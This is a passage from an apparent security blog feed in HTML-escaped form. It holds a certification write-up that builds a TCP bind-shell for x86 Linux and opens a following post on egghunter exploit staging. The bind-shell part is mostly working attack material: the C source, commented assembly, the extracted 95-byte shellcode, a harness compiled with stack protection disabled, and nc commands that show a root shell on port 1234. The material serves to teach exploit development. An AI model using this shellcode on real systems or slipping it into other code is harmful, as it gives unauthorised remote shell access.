+    &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;sockaddr_in&lt;/span&gt; &lt;span class="n"&gt;server_addr&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;server_addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sin_family&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;           &lt;span class="c1"&gt;// IPv4&lt;/span&gt;
+    &lt;span class="n"&gt;server_addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sin_addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;s_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;INADDR_ANY&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;   &lt;span class="c1"&gt;// All interfaces (0.0.0.0)&lt;/span&gt;
+    &lt;span class="n"&gt;server_addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sin_port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;htons&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PORT&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;         &lt;span class="c1"&gt;// Port #&lt;/span&gt;
+
+    &lt;span class="c1"&gt;// Bind socket to local interface(s) &lt;/span&gt;
+    &lt;span class="n"&gt;bind&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;listen_sock&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;sockaddr&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;server_addr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;server_addr&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+
+    &lt;span class="c1"&gt;// Start listening&lt;/span&gt;
+    &lt;span class="n"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;listen_sock&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+    &lt;span class="c1"&gt;// Accept incoming connection and create socket for it &lt;/span&gt;
+    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;conn_sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;accept&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;listen_sock&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+    &lt;span class="c1"&gt;// Forward process&amp;#39;s stdin, stdout and stderr to the incoming connection&lt;/span&gt;
+    &lt;span class="n"&gt;dup2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;conn_sock&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;dup2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;conn_sock&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;dup2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;conn_sock&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+    &lt;span class="c1"&gt;// Run shell&lt;/span&gt;
+    &lt;span class="n"&gt;execve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;After we compile and start it we should make sure that the program is working:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# Build and start the program&lt;/span&gt;
+gcc bindshell.c -o bindshell &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./bindshell
+
+&lt;span class="c"&gt;# Connect from another console and execute some commands making sure you got the shell&lt;/span&gt;
+nc localhost 1234
+id
+&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt;
+^C
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now, to get a compact shellcode we first need to translate the above C code into Assembly.&lt;/p&gt;
+&lt;p&gt;One nitty gritty detail you must be aware of is that four socket-related functions that were used in the C program actually use the same kernel entry point - &lt;code&gt;socketcall&lt;/code&gt;. The manual page for this syscall (&lt;code&gt;man 2 socketcall&lt;/code&gt;) says that only standard library implementers and kernel hackers need to know about it. It also says that this implementation is x86 platform specific and that on x86-64 and ARM there is no &lt;code&gt;socketcall&lt;/code&gt; system call; instead &lt;code&gt;socket&lt;/code&gt;, &lt;code&gt;accept&lt;/code&gt;, &lt;code&gt;bind&lt;/code&gt;, and all other socket functions are implemented as separate system calls.&lt;/p&gt;
+&lt;p&gt;Here comes the Assembly version of the TCP bind shell with my extensive commments:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
+
+&lt;span class="nl"&gt;_start:&lt;/span&gt;
+    &lt;span class="c1"&gt;; Reference: socketcall(int call, unsigned long *args)&lt;/span&gt;
+
+    &lt;span class="c1"&gt;; Create listening socket: EAX = socket(AF_INET, SOCK_STREAM, 0)&lt;/span&gt;
+    &lt;span class="c1"&gt;; EAX will contain listening socket file descriptor&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;  &lt;span class="c1"&gt;; zero out ebx&lt;/span&gt;
+    &lt;span class="nf"&gt;mul&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;       &lt;span class="c1"&gt;; implicitly zero out eax and edx &lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x66&lt;/span&gt;  &lt;span class="c1"&gt;; socketcall syscall #&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;bl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x1&lt;/span&gt;   &lt;span class="c1"&gt;; socket function #&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;      &lt;span class="c1"&gt;; 3rd arg to socket function&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mh"&gt;0x1&lt;/span&gt; &lt;span class="c1"&gt;; SOCK_STREEAM - 2nd arg to socket function&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mh"&gt;0x2&lt;/span&gt; &lt;span class="c1"&gt;; 1st arg: socket domain = 2 (AF_INET)&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;  &lt;span class="c1"&gt;; Copy args address to ECX &lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;
+
+    &lt;span class="c1"&gt;; Bind previously created socket to 0.0.0.0 interface and 1234 port   &lt;/span&gt;
+    &lt;span class="c1"&gt;; EAX = bind(listen_sock, &amp;amp;sockaddr_in, sizeof(sockaddr_in))&lt;/span&gt;
+    &lt;span class="c1"&gt;; EAX will be 0 on success&lt;/span&gt;
+    &lt;span class="nf"&gt;xchg&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;  &lt;span class="c1"&gt;; save listening socket descriptor to edi&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;   &lt;span class="c1"&gt;; zero out eax&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x66&lt;/span&gt;   &lt;span class="c1"&gt;; socketcall syscall #&lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;        &lt;span class="c1"&gt;; bind func # (reusing 1st arg of the prev func)&lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;esi&lt;/span&gt;        &lt;span class="c1"&gt;; trashing 4 bytes from the stack &lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;       &lt;span class="c1"&gt;; sockaddr_in.sin_addr.s_addr (INADDR_ANY=0)&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;word&lt;/span&gt; &lt;span class="nv"&gt;port&lt;/span&gt; &lt;span class="c1"&gt;; sockaddr_in.sin_port = 1234&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;word&lt;/span&gt; &lt;span class="nb"&gt;bx&lt;/span&gt;   &lt;span class="c1"&gt;; sin_family = 2 (AF_INET)&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;   &lt;span class="c1"&gt;; addr_len = 16 (structure size) (last 4 bytes are 0s left &lt;/span&gt;
+                   &lt;span class="c1"&gt;; from prev func args)&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;       &lt;span class="c1"&gt;; Copy args address to ECX &lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;       &lt;span class="c1"&gt;; Listening socket descriptor&lt;/span&gt;
+                   &lt;span class="c1"&gt;; Stack is now 0x0000000 [0x00000000, 0xd204, 0x0002], &lt;/span&gt;
+                   &lt;span class="c1"&gt;; 0x00000010, &amp;amp;sockaddr_in, socketfd&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;   &lt;span class="c1"&gt;; Copy listening socket descriptor address to ECX &lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;               
+
+    &lt;span class="c1"&gt;; Start listening: EAX = listen (sockfd, backlog)&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;       &lt;span class="c1"&gt;; Save socketfd&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;      &lt;span class="c1"&gt;; 2nd arg to listen func (0)&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;      &lt;span class="c1"&gt;; 1st arg to listen func (listening socket)&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;bl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x4&lt;/span&gt;   &lt;span class="c1"&gt;; listen function #&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;  &lt;span class="c1"&gt;; Address to args structure on stack&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x66&lt;/span&gt;  &lt;span class="c1"&gt;; socketcall sycall #&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;   
+
+    &lt;span class="c1"&gt;; Accept incoming connections: accept(sockfd, addr, arrlen)&lt;/span&gt;
+    &lt;span class="c1"&gt;; On success EAX will contain incoming socket descriptor&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;      &lt;span class="c1"&gt;; 3rd arg to accept func (0)&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;      &lt;span class="c1"&gt;; 2nd arg to accept func (0)&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;      &lt;span class="c1"&gt;; 1st arg to accept func (listening socket)&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;  &lt;span class="c1"&gt;; Copy address to args to ECX&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x66&lt;/span&gt;  &lt;span class="c1"&gt;; socketcall syscall #&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;bl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x5&lt;/span&gt;   &lt;span class="c1"&gt;; accept function #&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;   
+
+
+    &lt;span class="c1"&gt;; Redirect process&amp;#39;s stdin/out/err to the incoming socket   &lt;/span&gt;
+    &lt;span class="nf"&gt;xchg&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;  &lt;span class="c1"&gt;; 1st syscall arg in EBX = incoming socket fd&lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;        &lt;span class="c1"&gt;; 2nd syscall arg in ECX = listening socket fd &lt;/span&gt;
+&lt;span class="nl"&gt;.next_fd:&lt;/span&gt;          &lt;span class="c1"&gt;; Redirect all process&amp;#39;s fds ot incoming socket fd&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x3f&lt;/span&gt;   &lt;span class="c1"&gt;; dup2 syscall #&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;        
+    &lt;span class="nf"&gt;dec&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;         
+    &lt;span class="nf"&gt;jns&lt;/span&gt; &lt;span class="nv"&gt;.next_fd&lt;/span&gt;   &lt;span class="c1"&gt;; loop until ECX == -1 &lt;/span&gt;
+
+    &lt;span class="c1"&gt;; Start the shell &lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;               &lt;span class="c1"&gt;; push some delimiting nulls&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="mh"&gt;0x68732f2f&lt;/span&gt;  &lt;span class="c1"&gt;; push /bin//sh string &lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="mh"&gt;0x6e69622f&lt;/span&gt;  
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;           &lt;span class="c1"&gt;; 1st syscall arg: program address&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;               &lt;span class="c1"&gt;; push delimiting nulls &lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;           &lt;span class="c1"&gt;; 3rd syscall arg: env vars  &lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;               &lt;span class="c1"&gt;; Push program address string creating args array&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;           &lt;span class="c1"&gt;; 2nd syscall arg: args&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xb&lt;/span&gt;            &lt;span class="c1"&gt;; execve syscall #&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;
+
+    &lt;span class="nl"&gt;port:&lt;/span&gt; &lt;span class="nf"&gt;equ&lt;/span&gt; &lt;span class="mh"&gt;0xD204&lt;/span&gt; &lt;span class="c1"&gt;; = 1234 in little endian notation&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;After building a binary from the above source code we extract the shellcode and test it in the C program:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;nasm -f elf bindshell.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld -o bindshell bindshell.o
+scdump bindshell
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Output (formatted to fit on the screen):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;Length:  95
+Payload: &amp;quot;\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80&amp;quot;
+&amp;quot;\x97\x31\xc0\xb0\x66\x5b\x5e\x52\x66\x68\x04\xd2\x66\x53\x6a\x10\x51\x57\x89&amp;quot;
+&amp;quot;\xe1\xcd\x80\x31\xff\x5a\x57\x52\xb3\x04\x89\xe1\xb0\x66\xcd\x80\x57\x57\x52&amp;quot;
+&amp;quot;\x89\xe1\xb0\x66\xb3\x05\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x57\x68&amp;quot;
+&amp;quot;\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x57\x89\xe2\x53\x89\xe1\xb0\x0b&amp;quot;
+&amp;quot;\xcd\x80&amp;quot;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;That's it. We have a working shellcode that initiates listening on predetermined port and serves a &lt;code&gt;/bin/sh&lt;/code&gt; shell to anyone connecting to that port. To make sure the shellcode works as inteded let's run it from inside of our C shellcode-framing program:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
+
+&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x97\x31&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xc0\xb0\x66\x5b\x5e\x52\x66\x68\x04\xd2\x66\x53\x6a\x10\x51\x57\x89\xe1\xcd&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x80\x31\xff\x5a\x57\x52\xb3\x04\x89\xe1\xb0\x66\xcd\x80\x57\x57\x52\x89\xe1&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xb0\x66\xb3\x05\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x57\x68\x2f\x2f&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x57\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Shellcode length: %d&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;)();&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;After the build and successful test we can perform the winner dance =).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# In one console window&lt;/span&gt;
+gcc -fno-stack-protector -z execstack -o scframe scframe.c
+./scframe
+
+&lt;span class="c"&gt;# In the second console window&lt;/span&gt;
+nc localhost 1234
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;img alt="Bind TCP shell shellcode successful test" src="http://unlim.xyz/images/building-tcp-bind-shell-shellcode/tcp-bind-shellcode-successful-test.png" title="Bind TCP shell shellcode successful test" /&gt;
+&lt;div class="img-caption"&gt;Bind TCP shell shellcode successful test&lt;/div&gt;&lt;/p&gt;
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;hr&gt;
+This blog post was created for completing the requirements of the &lt;a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/"&gt;SecurityTube Linux Assembly Expert&lt;/a&gt; certification. Student id: SLAE-685.&lt;/p&gt;
+&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</summary><category term="exploit-development"></category><category term="slae"></category></entry><entry><title>Staging payload using Egghunter technique (SLAE, Assignment #3)</title><link href="http://unlim.xyz/blog/egghunter-technqiue-for-exploit-development/" rel="alternate"></link><updated>2015-10-04T19:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:unlim.xyz,2015-10-04:blog/egghunter-technqiue-for-exploit-development/</id><summary type="html">&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;This post is dedicated to the 3rd assignment of the &lt;a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/"&gt;SLAE&lt;/a&gt; certification exam. I prioritized this assignment because it is the only one that touched upon the subject not covered in the course.&lt;/p&gt;
+&lt;p&gt;The most often cited paper on &lt;em&gt;egghunter&lt;/em&gt; technique to date is &lt;a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf"&gt;Matt Miller's (aka skape) "Safely Searching Process Virtual Address Space"&lt;/a&gt;. To not deviate from the established tradition I will use that paper as the main reference too.&lt;/p&gt;
+&lt;p&gt;The whole technique is about staging your exploitation in two steps in cases when you have insufficient space for fitting the entire payload at the place where you gained execution control. It works similar to staged Metasploit payloads: the first payload (stager) exploits vulnerability, takes control of the execution and downloads the second part (stage) - the fully-fledged and feature-reach payload (e.g. Meterpreter). In case of the egghunter, the egg-searching code is a stager that is used to find a unqiue marker, the egg, and pass execution to the stage, the main payload, following the egg.&lt;/p&gt;
+&lt;p&gt;One important condition for using the egghunter technique is that besides exploiting a vulnerability that provides you with an opportunity for injecting the egghunter staging code, you must be able to somehow feed the vulnerable application your main payload such that it is stored somewhere in application's memory.&lt;/p&gt;
+&lt;h1&gt;The egg&lt;/h1&gt;
+&lt;p&gt;The recommended by Matt size of the shellcode is 8 bytes. The reason cited is that the implementations for the egg hunting algorithms tend to have a four byte version of the egg stored once in the searching code itself, thus making it possible to accidentally run into the egg hunter itself instead of the expected payload, if one were to use a four byte version of the egg. In the text below we will see how this issue can be overcome, at the same time reducing the egghunter size.&lt;/p&gt;
